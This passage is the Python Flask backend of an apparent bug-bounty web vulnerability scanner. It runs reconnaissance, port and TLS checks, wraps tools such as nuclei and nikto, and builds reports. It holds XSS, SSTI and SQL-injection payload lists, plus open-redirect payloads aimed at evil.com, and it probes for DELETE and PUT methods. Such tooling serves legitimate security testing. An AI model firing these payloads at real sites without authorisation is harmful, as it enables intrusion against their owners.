                sev, vtype = "LOW", "Forbidden (Resource Exists)"

            return {"path": path, "url": full_url, "status": code,
                    "type": vtype, "severity": sev,
                    "content_length": len(resp.content),
                    "server": resp.headers.get("Server",""),
                    "redirect": resp.headers.get("Location","")}
        except Exception:
            return None

    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        for res in ex.map(check_path, PATHS_TO_CHECK):
            if res:
                results.append(res)

    sev_order = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    return sorted(results, key=lambda x: sev_order.get(x["severity"],5))

# ─── XSS Basic ────────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>",
    '<svg onload=alert(1)>',
    '{{7*7}}',  # SSTI marker
]
XSS_PARAMS = ['q','search','id','name','query','term','input','text','s','keyword']

def check_xss_basic(target):
    url = base_url(target)
    findings = []
    tested = set()

    for param in XSS_PARAMS[:6]:
        for payload in XSS_PAYLOADS[:3]:
            key = f"{param}:{payload}"
            if key in tested:
                continue
            tested.add(key)
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(test_url, timeout=4, verify=False,
                                    headers={'User-Agent': 'Mozilla/5.0'})
                if payload == '{{7*7}}':
                    if '49' in resp.text:
                        findings.append({
                            "type":"SSTI","severity":"CRITICAL",
                            "url": test_url,"payload": payload,
                            "description": "Template injection: {{7*7}}=49 confirmed",
                            "poc": f"URL: {test_url}",
                            "remediation": "Never pass user input to template engine"
                        })
                elif payload in resp.text:
                    findings.append({
                        "type":"Reflected XSS","severity":"HIGH",
                        "url": test_url,"payload": payload,
                        "description": f"XSS payload reflected unencoded in response",
                        "poc": f"URL: {test_url}",
                        "remediation": "HTML-encode all user-controlled output"
                    })
                    break
            except Exception:
                pass
    return findings

# ─── Open Redirect ────────────────────────────────────────────────────────────

REDIRECT_PARAMS  = ['redirect','url','next','return','returnUrl','redirect_uri',
                    'return_url','goto','redir','destination','target','link','continue']
REDIRECT_PAYLOADS = ["https://evil.com", "//evil.com", "/\\evil.com"]

def check_open_redirect(target):
    url = base_url(target)
    findings = []
    for param in REDIRECT_PARAMS[:6]:
        for payload in REDIRECT_PAYLOADS:
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(test_url, timeout=4, verify=False,
                                    allow_redirects=False,
                                    headers={'User-Agent': 'Mozilla/5.0'})
                loc = resp.headers.get('Location','')
                if loc and ('evil.com' in loc or payload in loc):
                    findings.append({
                        "type":"Open Redirect","severity":"MEDIUM",
                        "url": test_url,"parameter": param,
                        "redirect_to": loc,
                        "description": f"Open redirect via '{param}' parameter → {loc}",
                        "poc": f"Visit: {test_url}",
                        "remediation": "Validate redirect targets against an allowlist"
                    })
                    break
            except Exception:
                pass
    return findings

# ─── SQL Injection Basic ──────────────────────────────────────────────────────

SQLI_PAYLOADS = [
    "'", "''", "' OR '1'='1", "' OR 1=1--", "\" OR 1=1--",
    "' OR 'x'='x", "1 OR 1=1", "1' ORDER BY 1--", "1 UNION SELECT NULL--",
]
SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "ora-0", "pg_query", "sqlite_",
    "microsoft sql", "syntax error", "unclosed quotation", "odbc_",
    "warning: mysql", "supplied argument is not a valid mysql",
    "you have an error in your sql syntax", "sqlexception",
]
SQLI_PARAMS = ['id', 'user', 'uid', 'search', 'q', 'query', 'name', 'username', 'page', 'item']

def check_sqli_basic(target):
    url = base_url(target)
    findings = []
    tested = set()

    for param in SQLI_PARAMS[:6]:
        for payload in SQLI_PAYLOADS[:5]:
            key = f"{param}:{payload}"
            if key in tested:
                continue
            tested.add(key)
            try:
                test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                resp = requests.get(test_url, timeout=5, verify=False,
                                    headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/2.0'})
                body_lc = resp.text.lower()
                matched_error = next((e for e in SQLI_ERRORS if e in body_lc), None)
                if matched_error:
                    findings.append({
                        "type": "SQL Injection",
                        "severity": "CRITICAL",
                        "url": test_url,
                        "parameter": param,
                        "payload": payload,
                        "error_signature": matched_error,
                        "description": f"Possible SQL injection via '{param}' — DB error signature detected: '{matched_error}'",
                        "poc": f"GET {test_url}\nPayload: {payload}",
                        "remediation": "Use parameterised queries / prepared statements. Never interpolate user input into SQL."
                    })
                    break  # one finding per param is enough
            except Exception:
                pass
    return findings

# ─── HTTP Methods Check ───────────────────────────────────────────────────────

DANGEROUS_METHODS = ['PUT', 'DELETE', 'PATCH', 'TRACE', 'CONNECT', 'OPTIONS',
                     'PROPFIND', 'PROPPATCH', 'MKCOL', 'COPY', 'MOVE', 'LOCK']

def check_http_methods(target):
    url = base_url(target)
    findings = []

    # First grab the OPTIONS response
    try:
        opts = requests.options(url, timeout=6, verify=False,
                                headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/2.0'})
        allowed_hdr = opts.headers.get('Allow', opts.headers.get('Access-Control-Allow-Methods', ''))
        allowed_methods = [m.strip().upper() for m in re.split(r'[,\s]+', allowed_hdr) if m.strip()]

        if allowed_methods:
            findings.append({
                "type": "HTTP Methods Exposed",
                "severity": "INFO",
                "url": url,
                "methods": allowed_methods,
                "description": f"Server reports allowed methods via OPTIONS: {', '.join(allowed_methods)}",
                "poc": f"OPTIONS {url} HTTP/1.1\nResponse Allow: {allowed_hdr}",
                "remediation": "Restrict HTTP methods to only those required by the application."
            })
    except Exception:
        allowed_methods = []

    # Probe dangerous methods individually
    for method in DANGEROUS_METHODS:
        try:
            resp = requests.request(method, url, timeout=5, verify=False,
                                    headers={'User-Agent': 'Mozilla/5.0 BugBountyHunter/2.0'})
            code = resp.status_code
            if code in (200, 201, 204, 301, 302, 405):
                sev = "INFO"
                if method in ('TRACE',) and code not in (405, 501):
                    sev = "MEDIUM"
                elif method in ('PUT', 'DELETE') and code not in (405, 501, 403):
                    sev = "HIGH"
                elif method in ('PROPFIND', 'MKCOL', 'COPY', 'MOVE') and code not in (405, 501):
                    sev = "MEDIUM"

                if sev != "INFO" or code not in (405, 501):
                    findings.append({
                        "type": "HTTP Method Allowed",
                        "severity": sev,
                        "url": url,
                        "method": method,
                        "status_code": code,
                        "description": f"HTTP {method} returned {code} — method may be accepted by server",
                        "poc": f"{method} {url} HTTP/1.1\nHost: {urllib.parse.urlparse(url).netloc}\n\nResponse: {code}",
                        "remediation": f"Disable {method} method unless explicitly required."
                    })
        except Exception:
            pass

    return findings

# ─── PoC report builder ───────────────────────────────────────────────────────

def quick_cvss(finding):
    base = {"CRITICAL":(9.0,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"),
            "HIGH":     (7.5,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"),
            "MEDIUM":   (5.3,"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"),
            "LOW":      (3.1,"CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N"),
            "INFO":     (0.0,"N/A")}
    s,v = base.get(finding.get("severity","INFO"),(0.0,"N/A"))
    return {"score":s,"vector":v,"severity":finding.get("severity","INFO")}

def generate_poc_report(target, findings):
    counts = {"CRITICAL":0,"HIGH":0,"MEDIUM":0,"LOW":0,"INFO":0}
    report_findings = []
    for f in findings:
        sev = f.get("severity","INFO")
        counts[sev] = counts.get(sev,0)+1
        report_findings.append({
            "id": f"FIND-{len(report_findings)+1:03d}",
            "type": f.get("type","Unknown"),
            "severity": sev,
            "description": f.get("description",""),
            "affected": f.get("url", f.get("path", target)),
            "poc": f.get("poc",""),
            "remediation": f.get("remediation",""),
            "cvss": quick_cvss(f)
        })
    sev_o = {"CRITICAL":0,"HIGH":1,"MEDIUM":2,"LOW":3,"INFO":4}
    report_findings.sort(key=lambda x: sev_o.get(x["severity"],5))
    c = counts
    total = len(findings)
    summary = (f"Assessment of {target} identified {total} finding(s): "
               f"{c['CRITICAL']} Critical, {c['HIGH']} High, {c['MEDIUM']} Medium, "
               f"{c['LOW']} Low, {c['INFO']} Info.")
    return {"title": f"Security Report – {target}",
            "target": target,
            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "severity_counts": counts,
            "findings": report_findings,
            "executive_summary": summary}

# ─── Main scan orchestrator ───────────────────────────────────────────────────

def run_full_scan(scan_id, raw_target, scan_type):
    """All-phases scan running in background thread."""
    target = clean_target(raw_target)   # FIX BUG 3 applied everywhere

    try:
        add_log(scan_id, f"🎯 Target: {target}", "info")
        active_scans[scan_id]["progress"] = 5

        # ── Phase 1: DNS + WHOIS + Subdomains ────────────────────────────────
        active_scans[scan_id]["phase"] = "DNS Recon"
        add_log(scan_id, "📡 Phase 1: DNS Reconnaissance", "info")
        dns_recs = resolve_target(target)
        active_scans[scan_id]["dns"] = dns_recs
        add_log(scan_id, f"✅ DNS: {len(dns_recs)} record(s) found", "success")
        for r in dns_recs:
            add_log(scan_id, f"   → {r['type']}: {r['value']}", "info")

        # real dig — zone transfer check
        dig_res = run_dig(target)
        if dig_res.get("zone_transfer_findings"):
            for f in dig_res["zone_transfer_findings"]:
                add_finding(scan_id, f)
                add_log(scan_id, f"   🚨 CRITICAL: DNS Zone Transfer on {f['ns']}!", "error")
        elif dig_res.get("ns_servers"):
            add_log(scan_id, f"   → NS servers: {', '.join(dig_res['ns_servers'][:3])}", "info")

        # WHOIS
        whois_res = run_whois(target)
        active_scans[scan_id]["whois"] = whois_res
        if whois_res.get("registrar"):
            add_log(scan_id, f"   → Registrar: {whois_res['registrar']}", "info")
        if whois_res.get("expires"):
            add_log(scan_id, f"   → Expires: {whois_res['expires']}", "info")

        # Subfinder (full scan only)
        if scan_type == "full":
            add_log(scan_id, "   🔍 Running subfinder…", "info")
            sub_res = run_subfinder(target)
            active_scans[scan_id]["subdomains"] = sub_res.get("subdomains", [])
            if sub_res["count"] > 0:
                add_log(scan_id, f"   ✅ {sub_res['count']} subdomain(s) found", "success")
                for s in sub_res["subdomains"][:5]:
                    add_log(scan_id, f"      → {s}", "info")
                if sub_res["count"] > 5:
                    add_log(scan_id, f"      … and {sub_res['count']-5} more", "info")
            else:
                add_log(scan_id, "   → No new subdomains discovered", "info")

        active_scans[scan_id]["progress"] = 15

        # ── Phase 2: HTTP Probe ───────────────────────────────────────────────
        active_scans[scan_id]["phase"] = "HTTP Probe"
        add_log(scan_id, "🌐 Phase 2: HTTP/HTTPS Probe", "info")
        http_info = get_http_info(target)
        active_scans[scan_id]["http_info"] = http_info
        if http_info.get("status"):
            proto = http_info.get("protocol","?")
            srv   = http_info.get("server","Unknown") or "Unknown"
            rt    = http_info.get("response_time","?")
            add_log(scan_id, f"✅ {proto} {http_info['status']} – Server: {srv} ({rt}s)", "success")
            if http_info.get("x_powered_by"):
                add_log(scan_id, f"   ⚠️  X-Powered-By: {http_info['x_powered_by']}", "warning")
        else:
            add_log(scan_id, f"⚠️  {http_info.get('error','No HTTP service')}", "warning")
        active_scans[scan_id]["progress"] = 25

        # ── Phase 3: Fingerprinting ───────────────────────────────────────────
        active_scans[scan_id]["phase"] = "Fingerprinting"
        add_log(scan_id, "🔍 Phase 3: Technology Fingerprinting", "info")
        techs = fingerprint_tech(target)

        # Augment with real whatweb output
        ww_res = run_whatweb(target)
        active_scans[scan_id]["whatweb_raw"] = ww_res.get("raw", "")
        ww_names = {t["name"].lower() for t in techs}
        for wt in ww_res.get("technologies", []):
            if wt["name"].lower() not in ww_names:
                techs.append(wt)
                ww_names.add(wt["name"].lower())

        active_scans[scan_id]["technologies"] = techs
        if techs:
            add_log(scan_id, f"✅ {len(techs)} technology(ies) detected:", "success")
            for t in techs:
                ver = f" v{t['version']}" if t.get("version") else ""
                src = t.get("source", "")
                add_log(scan_id, f"   → {t['name']}{ver} [{t.get('category','tech')}] via {src}", "info")
        else:
            add_log(scan_id, "   → No technologies identified", "info")
        active_scans[scan_id]["progress"] = 35

        # ── Phase 4: Port Scan ────────────────────────────────────────────────
        active_scans[scan_id]["phase"] = "Port Scan"
        add_log(scan_id, "🔌 Phase 4: Port Scanning", "info")
        try:
            ip = socket.gethostbyname(target)
            add_log(scan_id, f"   → Resolved: {ip}", "info")
        except Exception:
            ip = target
        ports = scan_ports_fast(target)
        active_scans[scan_id]["ports"] = ports
        if ports:
            add_log(scan_id, f"✅ {len(ports)} open port(s):", "success")
            for p in ports:
                banner = f" – {p['banner'][:60]}" if p.get("banner") else ""
                add_log(scan_id, f"   → {p['port']}/tcp OPEN ({p['service']}){banner}", "info")
                if p["port"] in DANGEROUS_PORTS:
                    add_finding(scan_id, {
                        "type": "Exposed Service",
                        "severity": "HIGH",
                        "description": f"Port {p['port']} ({p['service']}) exposed to internet",
                        "remediation": f"Restrict {p['service']} access with firewall rules"
                    })
        else:
            add_log(scan_id, "   → Common ports are filtered / closed", "info")
        active_scans[scan_id]["progress"] = 45

        # ── Phase 5: SSL/TLS ──────────────────────────────────────────────────
        active_scans[scan_id]["phase"] = "SSL/TLS"
        add_log(scan_id, "🔒 Phase 5: SSL/TLS Analysis", "info")
        ssl_res = check_ssl_tls(target)
        active_scans[scan_id]["ssl"] = ssl_res
        if ssl_res.get("certificate"):
            cert = ssl_res["certificate"]
            subj   = cert.get("subject",{}).get("commonName","N/A")
            issuer = cert.get("issuer",{}).get("organizationName","N/A")
            not_after = cert.get("not_after","")
            add_log(scan_id, f"✅ SSL OK – CN: {subj}", "success")
            add_log(scan_id, f"   → Issuer: {issuer}", "info")
            add_log(scan_id, f"   → Expires: {not_after}", "info")
            add_log(scan_id, f"   → TLS: {ssl_res.get('tls_version','?')} Cipher: {ssl_res.get('cipher',{}).get('name','?')}", "info")
            # Check cert expiry
            try:
                from datetime import datetime as _dt
                exp = _dt.strptime(not_after, "%b %d %H:%M:%S %Y %Z")
                days_left = (exp - _dt.utcnow()).days
                if days_left < 0:
                    add_finding(scan_id, {"type":"Expired SSL Certificate","severity":"CRITICAL",
                        "description":f"Certificate expired {-days_left} day(s) ago!",
                        "remediation":"Renew SSL certificate immediately"})
                    add_log(scan_id, f"   🚨 Certificate EXPIRED {-days_left} days ago!", "error")
                elif days_left < 14:
                    add_finding(scan_id, {"type":"SSL Certificate Expiring Soon","severity":"HIGH",
                        "description":f"Certificate expires in {days_left} day(s)!",
                        "remediation":"Renew SSL certificate ASAP"})
                    add_log(scan_id, f"   ⚠️  Cert expires in {days_left} days!", "warning")
                elif days_left < 30:
                    add_log(scan_id, f"   ⚠️  Cert expires in {days_left} days — plan renewal soon", "warning")
            except Exception:
                pass
        elif ssl_res.get("error"):
            add_log(scan_id, f"⚠️  SSL: {ssl_res['error']}", "warning")
        for f in ssl_res.get("findings",[]):
            add_finding(scan_id, f)
            add_log(scan_id, f"   🚨 {f['severity']}: {f['description']}", "warning")
        active_scans[scan_id]["progress"] = 55

        # ── Phase 6: Security Headers ─────────────────────────────────────────
        active_scans[scan_id]["phase"] = "Security Headers"
        add_log(scan_id, "🛡️  Phase 6: Security Headers", "info")
        hdr_res = check_security_headers(target)
        active_scans[scan_id]["security_headers"] = hdr_res
        hdr_findings = hdr_res.get("findings",[])
        add_log(scan_id, f"✅ Checked {hdr_res.get('headers_checked',0)} headers – {len(hdr_findings)} issue(s)", "success")
        for f in hdr_findings:
            add_finding(scan_id, f)
            lvl = "warning" if f["severity"] in ("HIGH","CRITICAL") else "info"
            add_log(scan_id, f"   → [{f['severity']}] {f['description']}", lvl)
        active_scans[scan_id]["progress"] = 65

        # ── Phase 7: CORS ─────────────────────────────────────────────────────
        active_scans[scan_id]["phase"] = "CORS"
        add_log(scan_id, "🌍 Phase 7: CORS Misconfiguration", "info")
        cors_findings = check_cors_misconfiguration(target)
        if cors_findings:
            for f in cors_findings:
                add_finding(scan_id, f)
                add_log(scan_id, f"   🚨 {f['severity']}: {f['description']}", "warning")
        else:
            add_log(scan_id, "   ✅ No CORS misconfigurations", "success")
        active_scans[scan_id]["progress"] = 75

        # ── Phase 8: Path Discovery ───────────────────────────────────────────
        active_scans[scan_id]["phase"] = "Path Discovery"
        add_log(scan_id, "📂 Phase 8: Path & Endpoint Discovery", "info")
        paths = check_common_paths(target)
        active_scans[scan_id]["paths"] = paths
        interesting = [p for p in paths if p["severity"] in ("CRITICAL","HIGH","MEDIUM")]
        if interesting:
            add_log(scan_id, f"⚠️  {len(interesting)} interesting path(s):", "warning")
            for p in interesting:
                add_finding(scan_id, p)
                add_log(scan_id, f"   → [{p['severity']}] {p['url']} [{p['status']}] {p['type']}", "warning")
        all_low = [p for p in paths if p["severity"] not in ("CRITICAL","HIGH","MEDIUM")]
        if all_low:
            add_log(scan_id, f"   ℹ️  {len(all_low)} low/info paths (robots, sitemap, login…)", "info")
        active_scans[scan_id]["progress"] = 85

        # ── Phase 9: Injection Tests + nikto + ffuf + nuclei (full mode) ────
        if scan_type == "full":
            active_scans[scan_id]["phase"] = "Injection Tests"
            add_log(scan_id, "💉 Phase 9: Injection & Redirect Tests", "info")
            xss = check_xss_basic(target)
            redir = check_open_redirect(target)
            for f in xss:
                add_finding(scan_id, f)
                add_log(scan_id, f"   🚨 {f['severity']}: {f['description']}", "error")
            for f in redir:
                add_finding(scan_id, f)
                add_log(scan_id, f"   ⚠️  {f['severity']}: {f['description']}", "warning")
            if not xss and not redir:
                add_log(scan_id, "   ✅ No basic injection issues detected", "success")

            # nikto
            active_scans[scan_id]["phase"] = "Nikto Scan"
            add_log(scan_id, "🕵️  Phase 9b: Nikto Web Vulnerability Scan", "info")
            nikto_res = run_nikto(target)
            active_scans[scan_id]["nikto"] = nikto_res
            if nikto_res["findings"]:
                add_log(scan_id, f"   ⚠️  Nikto: {len(nikto_res['findings'])} finding(s)", "warning")
                for f in nikto_res["findings"]:
                    add_finding(scan_id, f)
                    add_log(scan_id, f"   → [{f['severity']}] {f['description'][:100]}", "warning")
            else:
                add_log(scan_id, "   ✅ Nikto: No notable issues", "success")

            # ffuf directory fuzzing
            active_scans[scan_id]["phase"] = "Directory Fuzzing"
            add_log(scan_id, "📂 Phase 9c: ffuf Directory Fuzzing", "info")
            ffuf_res = run_ffuf(target)
            active_scans[scan_id]["ffuf"] = ffuf_res
            if ffuf_res["findings"]:
                add_log(scan_id, f"   ⚠️  ffuf: {len(ffuf_res['findings'])} path(s) found", "warning")
                for f in ffuf_res["findings"]:
                    if f["severity"] in ("HIGH", "MEDIUM"):
                        add_finding(scan_id, f)
                        add_log(scan_id, f"   → [{f['severity']}] {f['description']}", "warning")
                    else:
                        add_log(scan_id, f"   → [{f['severity']}] {f['description']}", "info")
            else:
                add_log(scan_id, "   ✅ ffuf: No hidden directories found", "success")

            # nuclei
            active_scans[scan_id]["phase"] = "Nuclei Scan"
            add_log(scan_id, "☢️  Phase 9d: Nuclei Template Scan", "info")
            nuclei_res = run_nuclei(target)
            active_scans[scan_id]["nuclei"] = nuclei_res
            if nuclei_res["findings"]:
                add_log(scan_id, f"   🚨 Nuclei: {len(nuclei_res['findings'])} finding(s)!", "error")
                for f in nuclei_res["findings"]:
                    add_finding(scan_id, f)
                    add_log(scan_id, f"   → [{f['severity']}] {f.get('name','')}: {f['description'][:80]}", "warning")
            else:
                add_log(scan_id, "   ✅ Nuclei: No template matches", "success")

        active_scans[scan_id]["progress"] = 95

        # ── Phase 10: PoC Report ──────────────────────────────────────────────
        active_scans[scan_id]["phase"] = "Generating Report"
        add_log(scan_id, "📊 Generating PoC Report…", "info")
        all_findings = active_scans[scan_id]["findings"]
        report = generate_poc_report(target, all_findings)
        active_scans[scan_id]["poc_report"] = report

        c = report["severity_counts"]
        add_log(scan_id, "━"*48, "info")
        add_log(scan_id, "🎉 SCAN COMPLETE", "success")
        add_log(scan_id, f"📋 Total: {len(all_findings)} finding(s)", "info")
        add_log(scan_id, f"   🔴 Critical: {c.get('CRITICAL',0)}", "error" if c.get('CRITICAL') else "info")
        add_log(scan_id, f"   🟠 High:     {c.get('HIGH',0)}", "warning" if c.get('HIGH') else "info")
        add_log(scan_id, f"   🟡 Medium:   {c.get('MEDIUM',0)}", "warning" if c.get('MEDIUM') else "info")
        add_log(scan_id, f"   🟢 Low:      {c.get('LOW',0)}", "info")
        add_log(scan_id, f"   ℹ️  Info:    {c.get('INFO',0)}", "info")
        add_log(scan_id, "━"*48, "info")

        active_scans[scan_id].update({
            "progress": 100, "status": "completed",
            "completed": True,
            "finished": datetime.now().isoformat(),
            "findings_count": len(all_findings)   # FIX BUG 5
        })

    except Exception as e:
        add_log(scan_id, f"❌ Scan error: {e}", "error")
        if scan_id in active_scans:
            active_scans[scan_id]["status"] = "error"
            active_scans[scan_id]["error"] = str(e)

# ─── API Routes ────────────────────────────────────────────────────────────────

@app.route('/api/health')
def api_health():
    tools = {}
    for t in ['nmap','subfinder','nuclei','ffuf','curl','dig','whois','whatweb','nikto']:
        tools[t] = subprocess.run(['which',t], capture_output=True).returncode == 0
    return jsonify({"status":"ok","version":"2.0.0","tools":tools})

@app.route('/api/scan/start', methods=['POST'])
def scan_start():
    data = request.json or {}
    raw = data.get('target','').strip()
    scan_type = data.get('scan_type','full')
    if not raw:
        return jsonify({"error":"Target required"}), 400
    scan_id = gen_scan_id()
    active_scans[scan_id] = {
        "id": scan_id, "target": clean_target(raw), "raw_target": raw,
        "scan_type": scan_type, "status": "running",
        "started": datetime.now().isoformat(),
        "progress": 0, "phase": "Starting",
        "logs": [], "findings": [], "findings_count": 0,
        "completed": False
    }
    threading.Thread(target=run_full_scan, args=(scan_id, raw, scan_type), daemon=True).start()
    return jsonify({"scan_id": scan_id, "status": "started", "target": active_scans[scan_id]["target"]})

@app.route('/api/scan/list')
def scan_list():
    # FIX BUG 1 & 5: include severity_counts so dashboard chart works
    out = []
    for s in active_scans.values():
        entry = {
            "id": s["id"], "target": s["target"],
            "status": s["status"], "started": s["started"],
            "progress": s["progress"], "scan_type": s["scan_type"],
            "findings_count": s.get("findings_count", len(s.get("findings",[])))
        }
        if s.get("poc_report"):
            entry["severity_counts"] = s["poc_report"]["severity_counts"]
        out.append(entry)
    return jsonify(sorted(out, key=lambda x: x.get("started",""), reverse=True))

@app.route('/api/scan/<sid>')
def scan_get(sid):
    if sid not in active_scans:
        return jsonify({"error":"Not found"}), 404
    return jsonify(active_scans[sid])

@app.route('/api/scan/<sid>/stream')
def scan_stream(sid):
    """
    FIX BUG 2: SSE stream – send explicit [DONE] event so client
    can distinguish clean end from network error.
    """
    def generate():
        if sid not in active_scans:
            yield f"data: {json.dumps({'type':'error','message':'Scan not found'})}\n\n"
            return

        last_log = 0
        last_find = 0

        while True:
            if sid not in active_scans:
                break
            scan = active_scans[sid]

            # New logs
            logs = scan.get("logs", [])
            if len(logs) > last_log:
                for log in logs[last_log:]:
                    yield f"data: {json.dumps({'type':'log','data':log})}\n\n"
                last_log = len(logs)

            # New findings
            finds = scan.get("findings", [])
            if len(finds) > last_find:
                for f in finds[last_find:]:
                    yield f"data: {json.dumps({'type':'finding','data':f})}\n\n"
                last_find = len(finds)

            # Progress tick
            progress_data = {
                'type': 'progress',
                'progress': scan.get('progress', 0),
                'phase': scan.get('phase', ''),
                'status': scan.get('status', '')
            }
            yield f"data: {json.dumps(progress_data)}\n\n"

            if scan.get("completed") or scan.get("status") == "error":
                # Send final complete event with full scan data
                yield f"data: {json.dumps({'type':'complete','scan':scan})}\n\n"
                # FIX BUG 2: explicit done signal so EventSource closes cleanly
                yield "data: {\"type\":\"done\"}\n\n"
                break

            time.sleep(0.4)

    return Response(stream_with_context(generate()),
                    mimetype='text/event-stream',
                    headers={'Cache-Control':'no-cache',
                             'X-Accel-Buffering':'no',
                             'Access-Control-Allow-Origin':'*'})

@app.route('/api/scan/<sid>/report')
def scan_report(sid):
    if sid not in active_scans:
        return jsonify({"error":"Not found"}), 404
    r = active_scans[sid].get("poc_report")
    if not r:
        return jsonify({"error":"Report not ready"}), 400
    return jsonify(r)

@app.route('/api/tools/dns', methods=['POST'])
def tool_dns():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    t = clean_target(raw)
    return jsonify({"target": t, "records": resolve_target(t)})

@app.route('/api/tools/headers', methods=['POST'])
def tool_headers():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify(check_security_headers(raw))

@app.route('/api/tools/ports', methods=['POST'])
def tool_ports():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    t = clean_target(raw)
    return jsonify({"target": t, "ports": scan_ports_fast(t)})

@app.route('/api/tools/ssl', methods=['POST'])
def tool_ssl():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    t = clean_target(raw)
    return jsonify(check_ssl_tls(t))

@app.route('/api/tools/cors', methods=['POST'])
def tool_cors():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify({"target": raw, "findings": check_cors_misconfiguration(raw)})

@app.route('/api/tools/fingerprint', methods=['POST'])
def tool_fingerprint():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify({"target": raw, "technologies": fingerprint_tech(raw)})

@app.route('/api/tools/paths', methods=['POST'])
def tool_paths():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify({"target": raw, "paths": check_common_paths(raw)})

@app.route('/api/cvss/calculate', methods=['POST'])
def cvss_calc():
    d = request.json or {}
    AV = d.get('AV','N'); AC = d.get('AC','L'); PR = d.get('PR','N')
    UI = d.get('UI','N'); S  = d.get('S','U');  C  = d.get('C','N')
    I  = d.get('I','N');  A  = d.get('A','N')
    try:
        W = {
            "AV": {"N":0.85,"A":0.62,"L":0.55,"P":0.20},
            "AC": {"L":0.77,"H":0.44},
            "PR": {"N":{"U":0.85,"C":0.85},"L":{"U":0.62,"C":0.68},"H":{"U":0.27,"C":0.50}},
            "UI": {"N":0.85,"R":0.62},
            "CIA":{"H":0.56,"L":0.22,"N":0.00},
        }
        sc = (S == "C")
        isc_base = 1-(1-W["CIA"][C])*(1-W["CIA"][I])*(1-W["CIA"][A])
        isc = (7.52*(isc_base-0.029)-3.25*((isc_base-0.02)**15)) if sc else (6.42*isc_base)
        if isc <= 0:
            score = 0.0
        else:
            exp = 8.22*W["AV"][AV]*W["AC"][AC]*W["PR"][PR][S]*W["UI"][UI]
            raw  = min(1.08*(isc+exp),10) if sc else min(isc+exp,10)
            score = round(raw*10)/10
        sev = ("NONE" if score==0 else "LOW" if score<4 else
               "MEDIUM" if score<7 else "HIGH" if score<9 else "CRITICAL")
        vec = f"CVSS:3.1/AV:{AV}/AC:{AC}/PR:{PR}/UI:{UI}/S:{S}/C:{C}/I:{I}/A:{A}"
        return jsonify({"score":score,"severity":sev,"vector":vec,
                        "components":{"AV":AV,"AC":AC,"PR":PR,"UI":UI,"S":S,"C":C,"I":I,"A":A}})
    except Exception as e:
        return jsonify({"error":str(e)}), 400

@app.route('/api/tools/xss', methods=['POST'])
def tool_xss():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify({"target": raw, "findings": check_xss_basic(raw)})

@app.route('/api/tools/sqli', methods=['POST'])
def tool_sqli():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify({"target": raw, "findings": check_sqli_basic(raw)})

@app.route('/api/tools/methods', methods=['POST'])
def tool_methods():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify({"target": raw, "findings": check_http_methods(raw)})

@app.route('/api/tools/whois', methods=['POST'])
def tool_whois():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify(run_whois(raw))

@app.route('/api/tools/subfinder', methods=['POST'])
def tool_subfinder():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify(run_subfinder(raw))

@app.route('/api/tools/nikto', methods=['POST'])
def tool_nikto():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify(run_nikto(raw))

@app.route('/api/tools/ffuf', methods=['POST'])
def tool_ffuf():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify(run_ffuf(raw))

@app.route('/api/tools/nuclei', methods=['POST'])
def tool_nuclei():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    sev = (request.json or {}).get('severity', 'medium,high,critical')
    return jsonify(run_nuclei(raw, severity=sev))

@app.route('/api/tools/whatweb', methods=['POST'])
def tool_whatweb():
    raw = (request.json or {}).get('target','').strip()
    if not raw: return jsonify({"error":"Target required"}), 400
    return jsonify(run_whatweb(raw))

if __name__ == '__main__':
    print("[*] Bug Bounty Hunter Pro API v2.1 starting on :5000")
    app.run(host='127.0.0.1', port=5000, debug=False, threaded=True)
